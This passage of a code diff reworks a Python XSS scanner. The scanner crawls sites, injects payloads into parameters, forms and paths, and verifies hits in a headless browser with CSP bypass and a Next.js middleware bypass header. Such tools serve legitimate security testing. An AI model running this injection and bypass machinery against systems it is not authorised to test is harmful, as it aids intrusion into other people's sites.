+                if hasattr(self,'stats_ref'):self.stats_ref.reflections+=1
+            if not reflected or score<60 or conf<0.3:continue
+            
+            pmap={
+                'HTML_TAG':PAYLOADS.get('HTML_TAG',[]),
+                'CONSUMING':PAYLOADS.get('CONSUMING',[]),
+                'FOCUS':PAYLOADS.get('FOCUS',[]),
+                'TRANSITION':PAYLOADS.get('TRANSITION',[]),
+                'QUOTED_ATTR':PAYLOADS.get('QUOTED_ATTR',[]),
+                'UNQUOTED_ATTR':PAYLOADS.get('UNQUOTED_ATTR',[]),
+                'URI_ATTR':PAYLOADS.get('URI_ATTR',[]),
+                'URI_UNQUOTED':PAYLOADS.get('URI_ATTR',[]),
+                'EVENT_ATTR':PAYLOADS.get('JS_RAW',[]),
+                'JS_STRING':PAYLOADS.get('JS_STRING',[]),
+                'JS_RAW':PAYLOADS.get('JS_RAW',[]),
+                'TEMPLATE':PAYLOADS.get('TEMPLATE',[]),
+                'HTML_TEXT':PAYLOADS.get('HTML_TAG',[]),
+                'JS_COMMENT':PAYLOADS.get('JS_COMMENT',[]),
+                'GENERIC':PAYLOADS.get('HTML_TAG',[])+PAYLOADS.get('QUOTED_ATTR',[]),
+            }
+            
+            payloads=pmap.get(ctx,[])
+            to_run=[]
+            for p,pt,ps,psc,pv in payloads:
+                if psc<self.settings.filter:continue
+                if 'HTML_FULL' in enc and('<' in p or '>' in p):
+                    if not any(k in pt for k in['SCHEME','JS_RAW','B64','CONSTRUCTOR','TRANSITION','FOCUS']):continue
+                to_run.append((p,pt,ps,psc,pv))
+            
+            if self.settings.mode=='QUICK' and to_run:
+                unique={p[0]:p for p in to_run}
+                to_run=sorted(unique.values(),key=lambda x:x[3],reverse=True)[:5]
+            
+            tested=set()
+            for payload,ptype,sev,pscore,vtype in to_run:
+                if shutdown.is_set():return
+                if payload in tested:continue
+                tested.add(payload)
+                
+                data=target.params.copy()
+                data[param]=payload
+                url=target.base
+                if target.method=='GET':
+                    query=urlencode(data,safe=':/<>"')
+                    url=f"{target.base}?{query}"
+                
+                final_score=pscore+(5 if 'RAW' in enc and pscore<100 else 0)
+                final_conf=min(1.0,conf*(pscore/100.0))
+                f=Finding(vuln='XSS',type=ptype,severity=sev,score=final_score,base=target.base,url=url,param=param,payload=payload,verify_type=vtype,method=target.method,params=data,context=ctx,confidence=final_conf)
+                self.verify_queue.put_nowait(f)
+                if self.settings.mode=='QUICK' and final_score>=95:return
 
-    def get_cache(self, url: str) -> Optional[Tuple[float, str, Dict[str, Any]]]:
-        return self.cache.get(url)
-
-    def set_cache(self, url: str, baseline: str, metadata: Dict[str, Any]) -> None:
-        self.cache.set(url, (time.time(), baseline, metadata))
-
-    async def get_baseline(self, url: str) -> Tuple[str, Dict[str, Any], float]:
-        cached = self.get_cache(url)
-        if cached:
-            return cached[1], cached[2], 0.0
-        total_samples = CF.get("baseline_samples") + self.baseline_retries
-        console.print(f"[info]Acquiring baseline for: [highlight]{url}[/highlight]")
-        tasks = [self.rm.do_request(url, "GET") for _ in range(total_samples)]
-        responses = await asyncio.gather(*tasks, return_exceptions=True)
-        samples, latencies, headers_list = [], [], []
-        for res in responses:
-            if isinstance(res, Exception):
-                continue
-            status, resp, headers, latency = res
-            if 200 <= status < 300 and resp:
-                samples.append(resp)
-                latencies.append(latency)
-                headers_list.append(headers)
-        if not samples:
-            console.print(f"[error]No baseline response received for {url}.[/error]")
-            return "", {}, 0.0
-        samples_sorted = sorted(samples, key=len)
-        baseline = samples_sorted[len(samples_sorted) // 2]
-        avg_latency = sum(latencies) / len(latencies) if latencies else 0.0
-        metadata = {
-            "content_type": next((ctype for ctype, pat in CF["content_type_patterns"].items() 
-                                   if re.search(pat, headers_list[-1].get("content-type", "").lower())), "html"),
-            "avg_response_size": sum(len(s) for s in samples) / len(samples),
-            "dynamic_content": 1.0 - (sum(difflib.SequenceMatcher(None, s, baseline).ratio() for s in samples) / len(samples)),
-            "fingerprint": hashlib.sha256(baseline.encode()).hexdigest()[:16],
-            "timestamp": time.time(),
-            "avg_latency": avg_latency
-        }
-        self.set_cache(url, baseline, metadata)
-        console.print(f"[success]Baseline acquired. Avg Latency: {avg_latency:.3f}s[/success]")
-        return baseline, metadata, avg_latency
-
-    async def detect_reflections(self, url: str, progress: Progress, task_id: int) -> Dict[str, Dict[str, Any]]:
-        parsed = urlparse(url)
-        qs = parse_qsl(parsed.query, keep_blank_values=True)
-        params = list({k for k, _ in qs})
-        reflection_tasks = []
-        markers: Dict[str, str] = {}
-        for param in params:
-            if any(re.search(pat, param, re.IGNORECASE) for pat in self.blacklist):
-                logger.debug(f"Skipping param: {param}")
-                continue
-            marker = f"REF_{random.randint(10000,99999)}_{param}"
-            markers[param] = marker
-            reflection_tasks.append(param_reflection_check(url, param, marker, self.rm))
-        results = await asyncio.gather(*reflection_tasks)
-        for _ in params:
-            progress.update(task_id, advance=1)
-        return {param: {"marker": markers[param], "info": info} for param, (reflected, info) in zip(params, results) if reflected}
-
-    async def inject_params(self, url: str, baseline: str, base_latency: float, refl: Dict[str, Any],
-                              metadata: Dict[str, Any], progress: Progress, task_id: int) -> List[VulnResult]:
-        parsed = urlparse(url)
-        qs = parse_qsl(parsed.query, keep_blank_values=True)
-        content_type = metadata.get("content_type", "html")
-        payload_set = list(dict.fromkeys(self.payloads + self.ctx_payloads.get(content_type, []) + PayloadManager.BLIND_PAYLOADS))
-        payload_set = payload_set[:CF.get("max_payloads_per_param")]
-        vulns: List[asyncio.Task] = []
-        for param, orig in [(k, v) for k, v in qs if k in refl]:
-            for pay in payload_set:
-                async def do_inject(p=param, pay=pay, orig=orig) -> VulnResult:
-                    inj = orig + (pay if pay.startswith('"') else '">'+pay)
-                    new_q = [(k, inj if k == p else v) for k, v in qs]
-                    inj_url = urlunparse(parsed._replace(query=urlencode(new_q)))
-                    token = f"MetaX_{random.randint(10000,99999)}"
-                    status, resp, _, resp_latency = await self.rm.do_request(inj_url, "GET")
-                    score, reason = ScoreEngine.compute_score(pay, baseline, resp or "", base_latency, resp_latency)
-                    progress.update(task_id, advance=1)
-                    result = VulnResult(inj_url, "GET", p, pay, score, token, False, "", reason, resp_time=resp_latency)
-                    self.plugin_manager.run_plugins(result)
-                    return result
-                vulns.append(asyncio.create_task(do_inject()))
-        results = await asyncio.gather(*vulns)
-        return [r for r in results if r.score > 0]
-
-    async def inject_forms(self, url: str, baseline: str, base_latency: float, progress: Progress, task_id: int) -> List[VulnResult]:
-        vulns: List[asyncio.Task] = []
-        soup = BeautifulSoup(baseline, BS_PARSER)
-        forms = soup.find_all("form")
-        for form in forms:
-            if len(form.find_all("form")) > 1:
-                continue
-            action = form.get("action") or url
-            full_url = urljoin(url, action)
-            method = (form.get("method") or "GET").upper()
-            fields = [el for el in form.find_all(["input", "textarea", "select"]) if el.get("name")]
-            if not fields:
-                continue
-            for pay in self.payloads + PayloadManager.BLIND_PAYLOADS:
-                async def do_form(pn=fields[0].get("name"), pay=pay) -> VulnResult:
-                    data = {el.get("name"): (el.get("value") or "test") for el in fields}
-                    target = pn
-                    data[target] = data.get(target, "test") + (pay if pay.startswith('"') else '">'+pay)
-                    inj_url = urlunparse(urlparse(full_url)._replace(query=urlencode(data)))
-                    st, resp, _, resp_latency = await self.rm.do_request(inj_url, "GET" if method=="GET" else "POST", data=data)
-                    score, reason = ScoreEngine.compute_score(pay, baseline, resp or "", base_latency, resp_latency)
-                    progress.update(task_id, advance=1)
-                    result = VulnResult(inj_url, method, target, pay, score, None, False, "", reason, resp_time=resp_latency)
-                    self.plugin_manager.run_plugins(result)
-                    return result
-                vulns.append(asyncio.create_task(do_form()))
-        return await asyncio.gather(*vulns)
-
-    async def inject_path_payloads(self, url: str, baseline: str, base_latency: float, progress: Progress, task_id: int) -> List[VulnResult]:
-        vulns: List[asyncio.Task] = []
-        for pay in PayloadManager.PATH_PAYLOADS:
-            injected_url = inject_in_url_path(url, pay.replace("{rand}", str(random.randint(10000, 99999))))
-            async def do_path_inject(pay=pay) -> VulnResult:
-                token = f"MetaX_{random.randint(10000,99999)}"
-                status, resp, _, resp_latency = await self.rm.do_request(injected_url, "GET")
-                score, reason = ScoreEngine.compute_score(pay, baseline, resp or "", base_latency, resp_latency)
-                progress.update(task_id, advance=1)
-                result = VulnResult(injected_url, "GET", "PATH", pay, score, token, False, "", reason, resp_time=resp_latency)
-                self.plugin_manager.run_plugins(result)
-                return result
-            vulns.append(asyncio.create_task(do_path_inject()))
-        results = await asyncio.gather(*vulns)
-        return [r for r in results if r.score > 0]
-
-    async def crawl_website(self, url: str) -> Set[str]:
-        crawler = Crawler(self.rm, max_depth=CF.get("crawl_depth", 3))
-        discovered = await crawler.crawl(url, 0)
-        return discovered
-
-    def save_results_realtime(self, findings: List[VulnResult]) -> None:
-        output_path = Path(CF.get("output_dir")) / CF.get("realtime_file")
-        results_data = {
-            "metadata": {"timestamp": time.strftime('%Y-%m-%d %H:%M:%S'), "findings": len(findings)},
-            "results": [{
-                "url": f.url,
-                "method": f.method,
-                "param": f.param,
-                "payload": f.payload,
-                "score": f.score,
-                "verified": f.verified,
-                "severity": f.severity,
-                "reason": f.reason,
-                "pass_count": f.pass_count,
-                "resp_time": f.resp_time,
-                "verification_details": f.verification_details,
-                "trigger_conditions": f.trigger_conditions,
-                "mitigation": f.mitigation
+class Manager:
+    def __init__(self,settings,client,browser=None):
+        self.settings=settings
+        self.client=client
+        self.browser=browser
+        self.pool=None
+        self.verifier=None
+        self.health=Health(self.settings,self)
+        self.stats=Stats()
+        
+        if browser:
+            cap=max(1,psutil.cpu_count(logical=False) or 4)*2
+            self.pool=Pool(browser,cap)
+            self.verifier=Verifier(settings,self.pool)
+        
+        self.targets=asyncio.Queue()
+        self.verify_queue=asyncio.Queue()
+        self.results=asyncio.Queue()
+        self.findings=[]
+        self.all_findings=[]
+        self.shutdown=asyncio.Event()
+        self.sem=asyncio.Semaphore(self.settings.concurrency)
+        self.crawler=Crawler(self.client,self.settings,self.targets,self.sem,self.shutdown,self.pool)
+        self.scanner=Scanner(self.client,self.settings,self.verify_queue)
+        self.scanner.stats_ref=self.stats
+    
+    async def reset(self):
+        if self.pool and self.browser:
+            await self.pool.shutdown()
+            cap=max(1,psutil.cpu_count(logical=False) or 4)*2
+            self.pool=Pool(self.browser,cap)
+            self.verifier=Verifier(self.settings,self.pool)
+        
+        self.findings.clear()
+        for q in[self.targets,self.verify_queue,self.results]:
+            while not q.empty():
+                try:
+                    q.get_nowait()
+                    q.task_done()
+                except:break
+            await q.join()
+        
+        self.crawler=Crawler(self.client,self.settings,self.targets,self.sem,self.shutdown,self.pool)
+        self.scanner=Scanner(self.client,self.settings,self.verify_queue)
+        self.settings.reflect_tag=f"R{random.randint(10000,99999)}"
+    
+    async def run(self,url):
+        domain=urlparse(url).netloc
+        console.rule(f"[bold magenta]SCAN: {url}[/bold magenta]")
+        self.stats=Stats()
+        
+        self.sem=asyncio.Semaphore(self.settings.concurrency)
+        self.crawler.sem=self.sem
+        
+        if self.pool and not self.pool.ready.is_set():
+            await self.pool.init()
+        
+        health_task=asyncio.create_task(self._health_worker())
+        verify_task=None
+        if self.settings.verify and self.verifier and self.pool and self.pool.ready.is_set():
+            verify_task=asyncio.create_task(self._verify_worker())
+        report_task=asyncio.create_task(self._report_worker())
+        
+        try:
+            console.rule('[bold cyan]Phase 1: Crawl[/bold cyan]')
+            crawl_progress=Progress(SpinnerColumn(),TextColumn('[progress.description]{task.description}'),BarColumn(),TextColumn('{task.completed} visited'),TimeElapsedColumn(),console=console)
+            with crawl_progress:
+                task_id=crawl_progress.add_task('Crawling...',total=None,completed=0)
+                await self.crawler.crawl(url,crawl_progress,task_id)
+            
+            total=self.targets.qsize()
+            self.stats.targets_found=total
+            if total==0:
+                console.print('[yellow]No targets found[/yellow]')
+                return
+            
+            console.print(f"✅ Found {total} targets")
+            console.print(self.stats.get_panel())
+            console.rule('[bold magenta]Phase 2: Attack[/bold magenta]')
+            
+            scan_progress=Progress(TextColumn('[progress.description]{task.description}'),BarColumn(),TextColumn('{task.completed}/{task.total}'),TimeElapsedColumn(),console=console)
+            with scan_progress:
+                task_id=scan_progress.add_task('Attacking...',total=total)
+                workers=[asyncio.create_task(self._scan_worker(scan_progress,task_id)) for _ in range(self.settings.concurrency)]
+                await self.targets.put(None)
+                await asyncio.gather(*workers)
+            
+            console.print('[dim]Waiting for verification...[/dim]')
+            await self.verify_queue.put(None)
+            if verify_task:await verify_task
+            else:
+                while True:
+                    f=await self.verify_queue.get()
+                    if f is None:break
+                    self.results.put_nowait(f)
+                    self.verify_queue.task_done()
+            
+            await self.results.put(None)
+            await report_task
+            
+            verified=self.findings
+            self.all_findings.extend(verified)
+            if verified:
+                self._save_json(domain,verified)
+            
+            console.rule(f"[bold green]RESULTS: {domain}[/bold green]")
+            console.print(self._get_table(verified))
+        finally:
+            health_task.cancel()
+            await asyncio.gather(health_task,return_exceptions=True)
+            if verify_task and not verify_task.done():verify_task.cancel()
+            if report_task and not report_task.done():report_task.cancel()
+            await asyncio.gather(verify_task,report_task,return_exceptions=True)
+            console.rule(f"[bold magenta]COMPLETE: {url}[/bold magenta]")
+    
+    def _save_json(self,domain,findings):
+        os.makedirs('results',exist_ok=True)
+        fname=f"results/{re.sub(r'[^\\w\\-_\\.]','_',domain)}_report.json"
+        data={
+            'timestamp':datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+            'target':domain,
+            'total':len(findings),
+            'findings':[{
+                'vuln':f.vuln,
+                'type':f.type,
+                'severity':f.severity,
+                'score':f.score,
+                'verified':f.verified,
+                'base':f.base,
+                'url':f.url,
+                'param':f.param,
+                'method':f.method,
+                'payload':f.payload,
+                'context':f.context,
+                'exploits':list(f.exploits),
+                'payloads':list(f.payloads),
             } for f in findings]
         }
         try:
-            with output_path.open("w", encoding="utf-8") as f:
-                json.dump(results_data, f, indent=2, ensure_ascii=False)
-            console.print(f"[info]Realtime results updated: [highlight]{output_path}[/highlight][/info]")
+            with open(fname,'w',encoding='utf-8') as file:
+                json.dump(data,file,indent=2)
+            console.print(f"[yellow]Saved: {fname}[/yellow]")
         except Exception as e:
-            logger.debug(f"Realtime save error: {e}")
-
-    async def run_injection(self, url: str, progress: Progress, task_id: int) -> List[VulnResult]:
-        baseline, metadata, base_latency = await self.get_baseline(url)
-        refl_task = progress.add_task("[dim]Reflection Check[/dim]", total=len(parse_qsl(urlparse(url).query, keep_blank_values=True)), visible=True)
-        refl = await self.detect_reflections(url, progress, refl_task)
-        progress.update(refl_task, visible=False)
-        params_vulns = await self.inject_params(url, baseline, base_latency, refl, metadata, progress, task_id)
-        form_vulns = await self.inject_forms(url, baseline, base_latency, progress, task_id)
-        path_vulns = await self.inject_path_payloads(url, baseline, base_latency, progress, task_id)
-        return params_vulns + form_vulns + path_vulns
-
-    async def browser_verify(self, findings: List[VulnResult], progress: Progress, task_id: int) -> List[VulnResult]:
-        if not findings:
-            return []
-        console.print("[info]Starting browser verification...[/info]")
+            log.error(f"Save failed: {e}")
+    
+    def _get_table(self,findings):
+        table=Table(box=HEAVY_HEAD,header_style='bold magenta',show_lines=True,expand=True)
+        table.add_column('V',justify='center',ratio=1)
+        table.add_column('Score',style='yellow',ratio=1)
+        table.add_column('Conf',style='cyan',ratio=1)
+        table.add_column('Param',style='green',ratio=2)
+        table.add_column('Type',style='cyan',ratio=3)
+        table.add_column('Context',style='magenta',ratio=2)
+        table.add_column('PoC',style='blue',ratio=5)
+        
+        filtered=[f for f in findings if f.score>=self.settings.filter]
+        filtered.sort(key=lambda f:(not f.verified,-f.score))
+        
+        for f in filtered:
+            icon=''
+            if f.vuln=='OD':icon='[bold green]OD[/bold green]'
+            elif f.vuln=='SSRF':icon='[bold yellow]SSRF[/bold yellow]'
+            elif f.verified:icon='[green]✔[/green]'
+            else:icon='[yellow]![/yellow]'
+            
+            color='red' if f.severity=='Critical' else 'orange' if f.severity=='High' else 'yellow'
+            conf_color='green' if f.confidence>=0.8 else 'yellow' if f.confidence>=0.5 else 'red'
+            table.add_row(
+                icon,
+                f"[{color}]{f.score}[/]",
+                f"[{conf_color}]{int(f.confidence*100)}%[/]",
+                f"[bold]{f.param}[/] ({f.method})",
+                f"{f.type} ({f.severity})",
+                f.context.replace('CONTEXT_','').replace('SINK:',''),
+                f"[blue]{f.url}[/]"
+            )
+        
+        if not filtered:
+            table.add_row('[dim]•[/dim]','N/A','N/A','N/A','N/A','No findings')
+        
+        return table
+    
+    async def _health_worker(self):
         try:
-            async with async_playwright() as p:
-                extra_http_headers = {}
-                if CF.get("nextjs_bypass"):
-                    extra_http_headers["x-middleware-subrequest"] = CF.get("nextjs_bypass_payload")
-                browser_launcher = {"chromium": p.chromium, "firefox": p.firefox, "webkit": p.webkit}.get(CF.get("browser_type"), p.chromium)
-                browser = await browser_launcher.launch(headless=True, args=[
-                    "--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage",
-                    "--disable-setuid-sandbox", "--no-first-run", "--no-zygote"
-                ])
-                context = await browser.new_context(user_agent=CF.get("browser_user_agent"),
-                                                    viewport=CF.get("viewport"),
-                                                    java_script_enabled=True,
-                                                    bypass_csp=True,
-                                                    extra_http_headers=extra_http_headers)
-                async def verify_one(v: VulnResult) -> VulnResult:
-                    async with asyncio.Semaphore(CF.get("browser_concurrency")):
-                        v.pass_count = 0
-                        logs: List[str] = []
-                        success = 0
-                        for attempt in range(CF.get("browser_retry_attempts") + 1):
-                            page = None
-                            try:
-                                page = await context.new_page()
-                                await page.add_init_script(BROWSER_HOOK)
-                                for _ in range(CF.get("browser_passes")):
-                                    v.pass_count += 1
-                                    if v.method.upper() == "POST":
-                                        content = (
-                                            f"<html><body>"
-                                            f"<form id='f' method='POST' action='{html.escape(v.url)}'>"
-                                            f"<input name='{html.escape(v.param)}' value='{html.escape(v.payload)}'/>"
-                                            f"</form>"
-                                            f"<script>document.getElementById('f').submit();</script>"
-                                            f"</body></html>"
-                                        )
-                                        await page.set_content(content, wait_until="networkidle", timeout=CF.get("browser_timeout")*1000)
-                                    else:
-                                        try:
-                                            await page.goto(v.url, wait_until="networkidle", timeout=CF.get("browser_timeout")*1000)
-                                        except Exception as e:
-                                            logs.append(f"Nav error: {str(e)}")
-                                    await asyncio.sleep(CF.get("browser_wait"))
-                                    triggered = await page.evaluate("window.__METAXLOG") or []
-                                    logs.append(f"Pass {v.pass_count}: {triggered}")
-                                    if any(evt in t for t in triggered for evt in ["alert:", "confirm:", "prompt:"]):
-                                        success += 1
-                                    await asyncio.sleep(0.5)
-                                trigger_count = sum(1 for t in triggered if any(evt in t for evt in ["alert:", "confirm:", "prompt:"]))
-                                if (success / CF.get("browser_passes")) >= CF.get("required_success_rate"):
-                                    v.verified = True
-                                    additional = 80 + min(20, trigger_count * 5)
-                                    v.score = min(100, v.score + additional)
-                                    v.severity = "Critical" if v.score >= 95 else "High" if v.score >= 85 else "Medium" if v.score >= 70 else "Low"
-                                    v.trigger_conditions = {"triggers": triggered, "count": trigger_count}
-                                    break
-                                else:
-                                    v.verified = False
-                                    v.reason += f" | Browser: {success}/{CF.get('browser_passes')}"
-                                v.verification_details = " | ".join(logs)
-                            except Exception as e:
-                                logs.append(f"Browser error (attempt {attempt+1}): {str(e)}")
-                                await asyncio.sleep(1)
-                            finally:
-                                if page:
-                                    try:
-                                        await page.close()
-                                    except Exception:
-                                        pass
-                        progress.update(task_id, advance=1)
-                        return v
-                results: List[VulnResult] = []
-                for i in range(0, len(findings), CF.get("browser_batch_size")):
-                    batch = findings[i:i+CF.get("browser_batch_size")]
-                    results.extend(await asyncio.gather(*(verify_one(v) for v in batch)))
-                    if CF.get("enable_gc_during_verification"):
-                        import gc; gc.collect()
-                await context.close()
-                await browser.close()
-                return results
-        except Exception as e:
-            logger.error(f"Browser verification critical error: {e}")
-            return findings
+            while not self.shutdown.is_set():
+                await self.health.update()
+                await asyncio.sleep(2)
+        except asyncio.CancelledError:pass
+        except Exception as e:log.error(f"Health worker error: {e}")
+    
+    async def _scan_worker(self,progress,task_id):
+        try:
+            while True:
+                target=await self.targets.get()
+                if target is None or self.shutdown.is_set():
+                    self.targets.put_nowait(None)
+                    self.targets.task_done()
+                    break
+                
+                async with self.sem:
+                    if self.shutdown.is_set():
+                        self.targets.task_done()
+                        break
+                    try:
+                        await asyncio.wait_for(self.scanner.scan(target,self.shutdown),timeout=self.settings.timeout*5)
+                        self.stats.targets_scanned+=1
+                    except asyncio.TimeoutError:
+                        log.error(f"Scan timeout: {target.url}")
+                    except Exception as e:
+                        log.error(f"Scan error: {e}")
+                    finally:
+                        progress.update(task_id,advance=1,description=f"[cyan]Attacking[/cyan] | Found: {self.stats.findings} | Verified: {self.stats.verified}")
+                        self.targets.task_done()
+        except asyncio.CancelledError:pass
+        except Exception as e:log.error(f"Scan worker error: {e}")
+    
+    async def _verify_worker(self):
+        if not self.verifier:return
+        cap=max(1,psutil.cpu_count(logical=False) or 4)*2
+        sem=asyncio.Semaphore(cap)
+        active=set()
+        
+        async def verify_one(finding):
+            async with sem:
+                if self.shutdown.is_set():return
+                try:
+                    if finding.vuln in['OD','SSRF']:
+                        finding.verified=True
+                    else:
+                        verified=await asyncio.wait_for(self.verifier.verify(finding),timeout=self.settings.timeout*4)
+                        finding.verified=verified
+                except asyncio.TimeoutError:
+                    finding.verified=False
+                except Exception as e:
+                    log.error(f"Verify error: {e}")
+                    finding.verified=False
+                self.results.put_nowait(finding)
+        
+        try:
+            while True:
+                f=await self.verify_queue.get()
+                if f is None:
+                    self.verify_queue.task_done()
+                    break
+                task=asyncio.create_task(verify_one(f))
+                active.add(task)
+                task.add_done_callback(active.discard)
+                self.verify_queue.task_done()
+        except asyncio.CancelledError:pass
+        finally:
+            if active:await asyncio.gather(*active,return_exceptions=True)
+    
+    async def _report_worker(self):
+        unique={}
+        try:
+            while True:
+                f=await self.results.get()
+                if f is None:
+                    self.results.task_done()
+                    break
+                
+                if (f.verified or f.vuln in['OD','SSRF']) and f.score>=self.settings.filter:
+                    self.stats.findings+=1
+                    if f.verified:self.stats.verified+=1
+                    if f.confidence>=0.8:self.stats.high_confidence+=1
+                    key=(f.vuln,f.base,f.param,f.method)
+                    if key not in unique:
+                        f.exploits.add(f.type)
+                        f.payloads.add(f.payload)
+                        unique[key]=f
+                    else:
+                        existing=unique[key]
+                        if f.score>existing.score:
+                            existing.score=f.score
+                            existing.type=f.type
+                            existing.payload=f.payload
+                        existing.exploits.add(f.type)
+                        existing.payloads.add(f.payload)
+                        existing.verified=existing.verified or f.verified
+                
+                self.results.task_done()
+        except asyncio.CancelledError:pass
+        except Exception as e:log.error(f"Report worker error: {e}")
+        finally:
+            self.findings.extend(unique.values())
 
-    async def run_scan(self, urls: List[str], use_browser: bool = True, out_file: Optional[str] = None) -> None:
-        async with self.rm:
-            targets = set()
-            console.print("[step]Crawling for URLs...[/step]")
-            for url in urls:
-                if is_interesting(url):
-                    targets.add(url)
-                    targets.update(await self.crawl_website(url))
-            if not targets:
-                console.print("[error]No interesting URLs to scan.[/error]")
-                return
-            start = time.time()
-            console.rule("[step]Starting MetaX Scan[/step]")
-            conc = AdaptiveScheduler.concurrency(CF.get("max_concurrency"))
-            console.print(f"[info]Scanning [highlight]{len(targets)}[/highlight] URL(s) with adaptive concurrency: [highlight]{conc}[/highlight]. Browser verification: [highlight]{use_browser}[/highlight]")
-            if CF.get("scan_mode") == "quick":
-                CF["max_payloads_per_param"] = 5; CF["baseline_samples"] = 1
-            elif CF.get("scan_mode") == "deep":
-                CF["max_payloads_per_param"] = 15; CF["baseline_samples"] = 5
-            total_tasks = sum(len(parse_qsl(urlparse(u).query, keep_blank_values=True))*(1+len(self.payloads)) for u in targets)
-            aggregated_findings: List[VulnResult] = []
+async def main():
+    parser=argparse.ArgumentParser(description='Advanced Security Scanner')
+    parser.add_argument('-u','--url',help='Target URL')
+    parser.add_argument('-f','--file',help='Target file')
+    parser.add_argument('-d','--depth',type=int,default=15,help='Crawl depth (default: 15)')
+    parser.add_argument('--mode',choices=['QUICK','COMPREHENSIVE'],default='COMPREHENSIVE',help='Scan mode')
+    parser.add_argument('--crawl',choices=['static','dynamic'],default='static',help='Crawl mode')
+    parser.add_argument('--no-verify',action='store_false',dest='verify',help='Disable verification')
+    parser.add_argument('--debug',action='store_true',help='Debug browser')
+    parser.add_argument('-c','--concurrency',type=int,default=200,help='Concurrency')
+    parser.add_argument('-t','--timeout',type=int,default=15,help='Timeout')
+    parser.add_argument('--max-targets',type=int,default=5000,help='Max targets')
+    args=parser.parse_args()
+    
+    if not args.url and not args.file:
+        console.print('[red]Provide -u URL or -f FILE[/red]')
+        return
+    
+    settings=Settings(
+        mode=args.mode,
+        crawl=args.crawl,
+        depth=args.depth,
+        verify=args.verify,
+        debug=args.debug,
+        concurrency=args.concurrency,
+        timeout=args.timeout,
+        max_targets=args.max_targets
+    )
+    
+    console.print(Panel(Align.center('🚀 [bold]Security Scanner[/bold] 🚀'),border_style='blue'))
+    
+    client=None
+    playwright=None
+    browser=None
+    manager=None
+    shutdown=asyncio.Event()
+    
+    def handle_shutdown(*_):
+        console.print('\n[yellow]Shutting down...[/yellow]')
+        shutdown.set()
+        if manager:manager.shutdown.set()
+    
+    signal.signal(signal.SIGINT,handle_shutdown)
+    try:signal.signal(signal.SIGTERM,handle_shutdown)
+    except:pass
+    
+    try:
+        headers={
+            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        }
+        timeout_obj=httpx.Timeout(settings.timeout,connect=settings.timeout,read=settings.timeout)
+        client=httpx.AsyncClient(verify=False,headers=headers,timeout=timeout_obj)
+        
+        if settings.verify or settings.crawl=='dynamic':
             try:
-                with Progress(SpinnerColumn(), TextColumn("{task.description}"), BarColumn(), TimeElapsedColumn(), TimeRemainingColumn(), console=console) as progress:
-                    inj_task = progress.add_task("Injection Phase", total=total_tasks)
-                    inj_tasks = [self.run_injection(u, progress, inj_task) for u in targets]
-                    for future in asyncio.as_completed(inj_tasks):
-                        findings = await future
-                        aggregated_findings.extend(findings)
-                        self.save_results_realtime(aggregated_findings)
-                table = Table(title="Injection Results", expand=True)
-                table.add_column("URL", overflow="fold")
-                table.add_column("Param", overflow="fold")
-                table.add_column("Payload", overflow="fold")
-                table.add_column("Score", justify="right")
-                for f in sorted(aggregated_findings, key=lambda x: x.score, reverse=True):
-                    table.add_row(f.url, str(f.param), f.payload, str(f.score))
-                console.print(table)
-                if use_browser and aggregated_findings:
-                    with Progress(SpinnerColumn(), TextColumn("{task.description}"), BarColumn(), TimeElapsedColumn(), TimeRemainingColumn(), console=console) as progress:
-                        ver_task = progress.add_task("Browser Verification", total=len(aggregated_findings))
-                        aggregated_findings = await self.browser_verify(aggregated_findings, progress, ver_task)
-            finally:
-                pass
-            final = [v for v in aggregated_findings if (v.verified if CF.get("require_verification") and use_browser else v.score >= CF.get("score_filter"))]
-            sev_order = {"Critical": 3, "High": 2, "Medium": 1, "Low": 0}
-            final.sort(key=lambda f: (sev_order.get(f.severity, 0), f.score), reverse=True)
-            elapsed = time.time() - start
-            output_path = timestamped_file("metax_scan")
-            results_data = {
-                "metadata": {"scan_time": elapsed, "targets": len(targets), "findings": len(final),
-                             "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')},
-                "results": [{
-                    "url": f.url,
-                    "method": f.method,
-                    "param": f.param,
-                    "payload": f.payload,
-                    "score": f.score,
-                    "verified": f.verified,
-                    "severity": f.severity,
-                    "reason": f.reason,
-                    "pass_count": f.pass_count,
-                    "resp_time": f.resp_time,
-                    "verification_details": f.verification_details,
-                    "trigger_conditions": f.trigger_conditions,
-                    "mitigation": f.mitigation
-                } for f in final]
-            }
-            with output_path.open("w", encoding="utf-8") as f:
-                json.dump(results_data, f, indent=2, ensure_ascii=False)
-            console.rule("[success]Scan Complete[/success]")
-            console.print(Panel(f"Finished in {elapsed:.2f}s\nResults saved to: [highlight]{output_path}[/highlight]", style="bold bright_green"))
-            res_table = Table(title="Final MetaX Findings", expand=True)
-            res_table.add_column("✔", justify="center", style="bold")
-            res_table.add_column("Score", justify="right")
-            res_table.add_column("Severity", justify="center")
-            res_table.add_column("Method", justify="center")
-            res_table.add_column("Param", overflow="fold")
-            res_table.add_column("URL", overflow="fold")
-            res_table.add_column("Payload", overflow="fold")
-            res_table.add_column("Reason", overflow="fold")
-            res_table.add_column("Pass", justify="center")
-            color_map = {"Critical": "[critical]", "High": "[bold bright_red]", "Medium": "[bold bright_cyan]", "Low": "[bold bright_white]"}
-            for r in final:
-                check = "[green]✔[/green]" if r.verified else "[red]✘[/red]"
-                col = color_map.get(r.severity, "[bold bright_white]")
-                res_table.add_row(check, str(r.score), f"{col}{r.severity}[/]", r.method, str(r.param), r.url, r.payload, r.reason, str(r.pass_count))
-            console.print(res_table)
-            console.print(Panel(f"Total Findings: [bold]{len(final)}[/bold]\nScan Time: [bold]{elapsed:.2f}s[/bold]", title="[bold bright_green]Summary[/bold bright_green]"))
-            if CF.get("dashboard_enabled"):
-                console.print("[info]Dashboard integration not implemented yet.[/info]")
+                playwright=await async_playwright().start()
+                browser=await playwright.chromium.launch(headless=not settings.debug)
+            except Exception as e:
+                console.print(f'[red]Browser launch failed: {e}[/red]')
+                settings.verify=False
+                settings.crawl='static'
+        
+        manager=Manager(settings,client,browser)
+        manager.shutdown=shutdown
+        
+        if args.url:
+            url=args.url if args.url.startswith('http') else f"http://{args.url}"
+            await manager.run(url)
+        elif args.file:
+            try:
+                with open(args.file,'r') as f:
+                    urls=[line.strip() for line in f if line.strip() and not line.startswith('#')]
+                if not urls:
+                    console.print('[yellow]No URLs in file[/yellow]')
+                else:
